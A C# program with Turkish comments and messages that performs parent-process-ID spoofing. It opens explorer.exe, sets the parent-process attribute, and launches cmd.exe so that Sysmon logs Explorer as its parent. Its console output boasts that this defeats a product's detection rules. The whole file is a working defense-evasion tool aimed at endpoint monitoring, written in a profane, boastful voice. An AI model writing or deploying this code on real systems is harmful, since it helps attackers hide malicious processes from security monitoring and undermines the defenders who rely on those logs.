using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

class PPIDSpoofer
{
    // Windows API P/Invoke tanimlamalari
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, ref IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFOEX {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO {
        public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
        public int dwX; public int dwY; public int dwXSize; public int dwYSize;
        public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute;
        public int dwFlags; public short wShowWindow; public short cbReserved2;
        public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId;
    }

    static void Main()
    {
        Console.WriteLine("[*] PPID Spoofing Operasyonu Basliyor...");

        // 1. Hedef Babayi Bul (Masaustunu yoneten Explorer.exe)
        Process[] procs = Process.GetProcessesByName("explorer");
        if (procs.Length == 0) {
            Console.WriteLine("[!] Explorer bulunamadi amk."); return;
        }
        int parentPid = procs[0].Id;
        Console.WriteLine("[+] Kurban Baba (Explorer) PID: " + parentPid);

        // 2. Babaya PROCESS_CREATE_PROCESS (0x0080) yetkisiyle baglan!
        IntPtr hParent = OpenProcess(0x0080, false, parentPid);
        if (hParent == IntPtr.Zero) {
            Console.WriteLine("[!] Babaya erisemedik. Yetki yok!"); return;
        }

        // 3. Sahtekarlik icin Attribute Listesini ayarla (0x00020000 = PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)
        IntPtr lpSize = IntPtr.Zero;
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        IntPtr lpAttributeList = Marshal.AllocHGlobal(lpSize);
        InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize);

        // Pointer karmasasini sildik, direkt hParent'i ref olarak basiyoruz!
        UpdateProcThreadAttribute(lpAttributeList, 0, (IntPtr)0x00020000, ref hParent, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

        // 4. Yeni sureci sahte baba ile baslat (0x00080000 = EXTENDED_STARTUPINFO_PRESENT)
        STARTUPINFOEX siex = new STARTUPINFOEX();
        siex.StartupInfo.cb = Marshal.SizeOf(siex);
        siex.lpAttributeList = lpAttributeList;

        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        bool res = CreateProcess(null, "C:\\Windows\\System32\\cmd.exe", IntPtr.Zero, IntPtr.Zero, false, 0x00080000, IntPtr.Zero, null, ref siex, out pi);

        if (res) {
            Console.WriteLine("[+] CMD calisti! Yeni PID: " + pi.dwProcessId);
            Console.WriteLine("[+] Sysmon Event 1'e gore bunun babasi Explorer. Sentryfy kurallari ofsayta dustu amk!");
        } else {
            Console.WriteLine("[!] Hata ulan: " + Marshal.GetLastWin32Error());
        }
    }
} // Iste o unuttugun sihirli parantez burada!